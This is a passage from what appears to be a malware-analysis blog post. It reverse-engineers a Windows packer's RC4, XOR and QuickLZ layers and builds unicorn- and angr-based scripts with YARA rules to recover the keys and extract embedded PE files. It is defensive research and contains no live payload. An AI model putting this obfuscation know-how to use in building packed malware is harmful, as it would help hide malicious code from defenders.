<h2 id="11-hex-decode">1.1. Hex decode</h2>
<p>The first step is to decode the hex string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">chr</span> <span class="o">=</span> <span class="n">hexencoded_data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">next_chr</span> <span class="o">=</span> <span class="n">hexencoded_data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="n">v1</span> <span class="o">=</span> <span class="nf">is_valid_hex_chr</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="cm">/* not an hex digit, ciao */</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="n">v1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">v1</span> <span class="o">=</span> <span class="nf">is_valid_hex_chr</span><span class="p">(</span><span class="n">next_chr</span><span class="p">),</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">memset</span><span class="p">((</span><span class="n">ulonglong</span><span class="p">)</span><span class="n">destination</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">uVar2</span><span class="p">,</span><span class="n">chr</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">get_TEB</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                    <span class="p">(</span><span class="o">*</span><span class="n">RtlFreeHeap</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="o">/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="cm">/* convert 1st ascii chr to hex value, ex: &#39;a&#39; -&gt; 0xa */</span>
</span></span><span class="line"><span class="cl">                <span class="n">v1</span> <span class="o">=</span> <span class="nf">hex_digit_to_int</span><span class="p">(</span><span class="n">chr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/* 0xa -&gt; 0xa0 */</span>
</span></span><span class="line"><span class="cl">                <span class="n">high4</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">v1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="cm">/* convert 2nd ascii chr to hex value &#39;8&#39; -&gt; 0x8 */</span>
</span></span><span class="line"><span class="cl">                <span class="n">low4</span> <span class="o">=</span> <span class="nf">hex_digit_to_int</span><span class="p">(</span><span class="n">next_chr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="cm">/* make it a byte: 0xa0 | 0x8 == 0xa8 */</span>
</span></span><span class="line"><span class="cl">                <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">destination</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="n">high4</span> <span class="o">|</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">low4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span></code></pre></div><p>this is a plain equivalent to python&rsquo;s <code>bytes.fromhex(...)</code></p>
<h2 id="12-rc4">1.2. RC4</h2>
<p>The RC4 routine is easily identified:</p>
<p><img src="rc4.png" alt="RC4"></p>
<p>The parameters 4 and 5 are respectively a pointer to the key and the length of the key (which is always 4 apparently).</p>
<h2 id="13-xor">1.3. XOR</h2>
<p>The XOR was not present in all samples i checked, but when applied, it reuses the RC4 key.</p>
<p><img src="xor.png" alt="XOR"></p>
<p>It looks intimidating but in reality it can be translated to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span> 
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">x</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span> <span class="o">-</span> <span class="n">data</span><span class="p">[</span><span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span></span></code></pre></div><h2 id="13-quicklz">1.3. QuickLZ</h2>
<p>The QuickLZ part was harder to identify.
On the first sample I analyzed, there was no compression applied, so at this point the
decrypted data looked OK</p>
<p>I could find a valid PE file inside the decrypted data:</p>
<pre tabindex="0"><code>00000db0  7c 4d 5a 90 00 03 00 00  00 04 00 00 00 ff ff 00  ||MZ.............|
00000dc0  00 b8 00 00 00 00 00 00  00 40 00 00 00 00 00 00  |.........@......|
00000dd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000de0  00 00 00 00 00 00 00 00  00 00 00 00 00 d0 00 00  |................|
00000df0  00 0e 1f ba 0e 00 b4 09  cd 21 b8 01 4c cd 21 54  |.........!..L.!T|
00000e00  68 69 73 20 70 72 6f 67  72 61 6d 20 63 61 6e 6e  |his program cann|
00000e10  6f 74 20 62 65 20 72 75  6e 20 69 6e 20 44 4f 53  |ot be run in DOS|
00000e20  20 6d 6f 64 65 2e 0d 0d  0a 24 00 00 00 00 00 00  | mode....$......|
00000e30  00 21 c9 10 93 65 a8 7e  c0 65 a8 7e c0 65 a8 7e  |.!...e.~.e.~.e.~|
</code></pre><p>but i still noticed some kind of header at the very beginning of the extracted data, and that
the dword starting at offset 1 was actually the size of the data blob
<img src="header.png" alt="header"></p>
<p>I thought it was some kind of internal structure I could just ignore, until I started
having issues with some samples where the embedded PE file seemed corrupt:</p>
<pre tabindex="0"><code>00000c40  3e eb df 8f 46 03 4d 5a  90 00 03 f3 03 00 80 46  |&gt;...F.MZ.......F|
00000c50  8a 10 ff ff cd 17 20 c6  00 06 93 fb 01 00 0b f2  |...... .........|
00000c60  03 0e 1f ba 0e 00 b4 09  cd 21 b8 01 4c cd 21 54  |.........!..L.!T|
00000c70  68 69 73 20 70 72 00 00  00 80 6f 67 72 61 6d 20  |his pr....ogram |
00000c80  63 61 6e 6e 6f 74 20 62  65 20 72 75 6e 20 69 6e  |cannot be run in|
00000c90  20 44 4f 53 20 6d 6f 64  65 20 40 10 c4 2e 0d 0d  | DOS mode @.....|
00000ca0  0a 24 12 11 21 c9 10 93  65 a8 7e c0 16 01 42 6e  |.$..!...e.~...Bn|
00000cb0  05 c0 67 20 16 ca 7f c1  6e 0a 05 7f c0 4f 20 08  |..g ....n....O .|
00000cc0  0a 07 88 83 cc 7a 0a 04  83 cc 7e c1 64 0a 02 7c  |.....z....~.d..||
00000cd0  0a 02 52 69 63 68 06 0e  16 25 8b 5e 03 64 86 07  |..Rich...%.^.d..|
</code></pre><p>After some time staring at the code, it turned out that it&rsquo;s using <a href="http://www.quicklz.com/">QuickLZ</a>.</p>
<p>Major pointers were:</p>
<ul>
<li>the header format, as described <a href="https://github.com/ReSpeak/quicklz/blob/master/Format.md">here</a>:</li>
</ul>
<pre tabindex="0"><code>┌─────╥──╥──╥──╥──╥──╥──╥──╥──┐
│Flags║ Comp size ║ Dec size  │
└─────╨──╨──╨──╨──╨──╨──╨──╨──┘
</code></pre><ul>
<li>finding code like this
<img src="qlz_ghidra.png" alt="QuickLZ ghidra"></li>
</ul>
<p>looking very very similar to <a href="https://github.com/sergey-dryabzhinsky/python-quicklz/blob/master/quicklz.c#L630">https://github.com/sergey-dryabzhinsky/python-quicklz/blob/master/quicklz.c#L630</a>
<img src="qlz_github.png" alt="QuickLZ ghithub"></p>
<p>Luckily for us there&rsquo;s python bindings for QuickLZ, which work just fine: <a href="https://pypi.org/project/pyquicklz/">https://pypi.org/project/pyquicklz/</a>.</p>
<h2 id="14-split">1.4 Split</h2>
<p>The decrypted data blob can be split at every occurences of the <code>|SPL|</code> marker, the string is build on the stack:
<img src="marker.png" alt="marker"></p>
<p>I kind of skipped the details in my analysis because i do not need them for now.</p>
<h1 id="2-automating">2. Automating</h1>
<p>Right now we have everything we need for unpacking:</p>
<ul>
<li>the data blob is easy to grab from the data section, with a regex for example</li>
<li>RC4 is vanilla</li>
<li>the XOR is easy to implement</li>
<li>QuickLZ has python bindings</li>
</ul>
<p>The only thing we need to be able to recover is the RC4/XOR key, and that&rsquo;s where the fun begins.</p>
<p>The key is not stored as data, instead it&rsquo;s computed in the code and stored on the stack:</p>
<p><img src="rc4_key.png" alt="RC4 key"></p>
<p>so in this case the key is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x11c7425e</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xc6</span><span class="s1">B</span><span class="se">\xc7\x11</span><span class="s1">&#39;</span>
</span></span></code></pre></div><h2 id="21-failed-approach">2.1. Failed Approach</h2>
<p>my first approach was to match the bytes using a YARA rule like:</p>
<pre tabindex="0"><code>            rule key {
                strings:
                    // C74424 34 5E42C711       | mov dword ptr ss:[rsp+34],11C7425E
                    // 834424 34 68             | add dword ptr ss:[rsp+34],68
                    $instr = { C7 44 24 ?? ?? ?? ?? ?? 8? ?? 24 ?? ?? }
                condition:
                    $instr
            }
</code></pre><p>emulate all the matches with <a href="https://www.unicorn-engine.org/">unicorn</a>, fetch the result from the stack and try all values as keys.</p>
<p>The key grabbing looked like this and worked on some samples:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34; emulate the potential key instruction and return
</span></span></span><span class="line"><span class="cl"><span class="s2">    whatever 4 byte value is on the stack (or None)
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_TEXT</span>  <span class="o">=</span> <span class="mh">0x1000000</span>
</span></span><span class="line"><span class="cl">    <span class="n">ADDR_STACK</span> <span class="o">=</span> <span class="mh">0x7000000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">UC_MODE_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ADDR_TEXT</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ADDR_STACK</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># copy code</span>
</span></span><span class="line"><span class="cl">    <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ADDR_TEXT</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># init rsp</span>
</span></span><span class="line"><span class="cl">    <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RSP</span><span class="p">,</span> <span class="n">ADDR_STACK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># emulate</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">ADDR_TEXT</span><span class="p">,</span> <span class="n">ADDR_TEXT</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">unicorn</span><span class="o">.</span><span class="n">UcError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># read stack</span>
</span></span><span class="line"><span class="cl">    <span class="n">stack</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">ADDR_STACK</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># assume there&#39;s no null byte</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="p">[</span><span class="n">stack</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">stack</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">u32</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_keys</span><span class="p">(</span><span class="n">pe</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; find potential instructions setting the key
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># find .text</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">get_section</span><span class="p">(</span><span class="n">pe</span><span class="p">,</span> <span class="s1">&#39;.text&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="n">yara</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">            rule key {
</span></span></span><span class="line"><span class="cl"><span class="s2">                strings:
</span></span></span><span class="line"><span class="cl"><span class="s2">                    // C74424 34 5E42C711       | mov dword ptr ss:[rsp+34],11C7425E
</span></span></span><span class="line"><span class="cl"><span class="s2">                    // 834424 34 68             | add dword ptr ss:[rsp+34],68
</span></span></span><span class="line"><span class="cl"><span class="s2">                    $instr = { C7 44 24 ?? ?? ?? ?? ?? 8? ?? 24 ?? ?? }
</span></span></span><span class="line"><span class="cl"><span class="s2">                condition:
</span></span></span><span class="line"><span class="cl"><span class="s2">                    $instr
</span></span></span><span class="line"><span class="cl"><span class="s2">            }&#34;&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">yara_matches</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">yara_matches</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># potential code snippet setting the key</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_code</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">offset</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">yara_matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">string</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="n">string</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#print(string)</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_code</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">potential_keys</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">key_code</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;--- emulating:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#disasm(code)</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># assume no null byte in key</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="ow">not</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">potential_keys</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">potential_keys</span>
</span></span></code></pre></div><pre tabindex="0"><code> ./unpack2.py 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x20], 4
0x1008:	add	dword ptr [rsp + 0x20], 0
0x100d:	jmp	0x1067
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x34], 0x11c7425e
0x1008:	add	dword ptr [rsp + 0x34], 0x68
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x14], 0xa6
0x1008:	add	dword ptr [rsp + 0x14], 0x5a
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x20], 1
0x1008:	add	dword ptr [rsp + 0x20], 0
0x100d:	jmp	0x101f
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x60], 0
0x1008:	add	dword ptr [rsp + 0x60], 2
0x100d:	jmp	0xfda
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x50], 2
0x1008:	add	dword ptr [rsp + 0x50], 2
0x100d:	cmp	bl, bl
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x70], 0
0x1008:	add	dword ptr [rsp + 0x70], 3
0x100d:	cmp	bp, bp
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 0x800000e0
0x1008:	sub	dword ptr [rsp + 0x28], 0xe0
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 0x800000e0
0x1008:	sub	dword ptr [rsp + 0x28], 0xe0
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x44], 0
0x1008:	add	dword ptr [rsp + 0x44], 3
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x24], 4
0x1008:	add	dword ptr [rsp + 0x24], 0
0x100d:	jmp	0x1073
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 0x800000e0
0x1008:	sub	dword ptr [rsp + 0x28], 0xe0
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x24], 3
0x1008:	add	dword ptr [rsp + 0x24], 1
0x100d:	jmp	0x1086
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x24], 1
0x1008:	add	dword ptr [rsp + 0x24], 0
0x100d:	jmp	0x100f
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 1
0x1008:	add	dword ptr [rsp + 0x28], 0
0x100d:	jmp	0x1050
0x100f:	nop
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 3
0x1008:	add	dword ptr [rsp + 0x28], 1
0x100d:	jmp	0xff6
--- emulating:
0x1000:	mov	dword ptr [rsp + 0x28], 0x7ffffa1
0x1008:	add	dword ptr [rsp + 0x28], 0x5f
0x100d:	cmp	di, di
found 1 potential keys: [b&#39;\xc6B\xc7\x11&#39;]
got 0x4c04b data blob
decrypted data
- dump 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.dump
found 5 elements
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.0
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.1
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.2
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.3
- dumped 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7.bin.extracted.4
</code></pre><p>until the flow obfuscation of some samples brought even more fun to the party by putting a jump right in the middle of the key setting:
<img src="rc4_key_obf1.png" alt="RC4 key 1"></p>
<p><img src="rc4_key_obf2.png" alt="RC4 key 2"></p>
<p>rendering my initial and pretty naive approach useless.</p>
<h2 id="22-angr">2.2. angr</h2>
<p>I only played with <a href="https://angr.io/">angr</a> before to solve crackmes and CTF challenges, and I wanted to do something else with it to practice (because let&rsquo;s face it, i&rsquo;m pretty bad with angr).</p>
<p>To quote their website:</p>
<pre tabindex="0"><code>angr is an open-source binary analysis platform for Python.
It combines both static and dynamic symbolic (&#34;concolic&#34;) analysis, providing tools to solve a variety of tasks.
</code></pre><p>My new goal was:</p>
<ul>
<li>Identify the RC4 function using some heuristics</li>
<li>Walk the control-flow graph (CFG) up to find where it&rsquo;s called from</li>
<li>Execute the function(s) calling the RC4 function up to the actual call</li>
<li>Get the key</li>
</ul>
<pre tabindex="0"><code>                              ┌────────────────────────────────────────────┐
                              │   FUNCTION WHATEVER                        │
                              │                                            │
                              ├────────────────────────────────────────────┤    step5: emulate from
                              │                                            ├────┐    0x0332 (function start)
                     ┌───────►│  0x0332    INSTR1                          │    │     to
step4: find function │        │  0x0334    INSTR2                          │    │    0x0456 (call rc4)
          start addr │        │     etc...                                 │    │
            0x332    │        │     ...                                    │    │
                     └────────┤     ...                                    │    │
                              │     ...                                    │    │
                     ┌───────►│  0x0456    CALL POTENTIAL_RC4              │ ◄──┘
                     │        │     ...                                    │    step6: dump the key parameter
                     │        │     ...                                    │
                     │        │     ...                                    │
step3: find XREF     │        │                                            │
       for 0x1234    │        │                                            │
       -&gt;  0x0456    │        │                                            │
                     │        └────────────────────────────────────────────┘
                     │
                     │
                     │
                     │        ┌────────────────────────────────────────────┐
                     │        │   FUNCTION POTENTIAL_RC4                   │
                     └────────┤                                            │
                              ├────────────────────────────────────────────┤
                              │                                            │
                     ┌──────► │ 0x1234     INSTR1                          │
                     │        │ 0x1236     INSTR2                          │
step2: find function │        │     etc...                                 │
          start addr │        │                                            │   step1: find offset with
            0x1234   │        │    ─────┐ ◄────────────────────────────────┼────────  heuristic (0x1430)
                     │        │ 0x1430  │  xor     eax, ecx                │
                     └────────┤ 0x1432  │  movsxd  rcx, dword [var_18h_2]  │
                              │   ──────┘                                  │
                              │                                            │
                              │                                            │
                              └────────────────────────────────────────────┘
</code></pre><p>Luckily <code>angr</code> can provide a CFG and has a sense of &ldquo;<em>function</em>&rdquo;.</p>
<p>We can define a project and get the CFG:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">prj</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">load_options</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;auto_load_libs&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">cfg</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span><span class="n">CFGFast</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="221-finding-the-rc4-function">2.2.1. Finding the RC4 Function</h3>
<p>I used some loosy heuristic to find the RC4 but it seems to work well:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">       <span class="c1"># find .text</span>
</span></span><span class="line"><span class="cl">        <span class="n">section</span> <span class="o">=</span> <span class="n">get_section</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">pe</span><span class="p">,</span> <span class="s1">&#39;.text&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">section</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># oddly enough this seems to match the rc4 function</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># fairly accurately</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># like</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 0x1800027c2      33c1                   xor     eax, ecx</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 0x1800027c4      48634c2418             movsxd  rcx, dword [var_18h_2]</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># or</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 0x180004242      0fb68c0cd0000000       movzx   ecx, byte [rsp + rcx + 0xd0]</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 0x18000424a      33c1                   xor     eax, ecx</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 0x18000424c      e974feffff             jmp     0x1800040c5 ; fcn.180003bbf+0x506</span>
</span></span><span class="line"><span class="cl">        <span class="n">rule</span> <span class="o">=</span> <span class="n">yara</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">            rule rc4 {
</span></span></span><span class="line"><span class="cl"><span class="s2">                strings:
</span></span></span><span class="line"><span class="cl"><span class="s2">                    //$s1 = { 33 c1 }
</span></span></span><span class="line"><span class="cl"><span class="s2">                    $s2 = { 33 c1 48 63 4c 24 ?? }
</span></span></span><span class="line"><span class="cl"><span class="s2">                    $s3 = { 33 c1 (e9 | 3a) }
</span></span></span><span class="line"><span class="cl"><span class="s2">                condition:
</span></span></span><span class="line"><span class="cl"><span class="s2">                    $s2 or $s3
</span></span></span><span class="line"><span class="cl"><span class="s2">            }&#34;&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># get matching offsets</span>
</span></span><span class="line"><span class="cl">        <span class="n">yara_matches</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
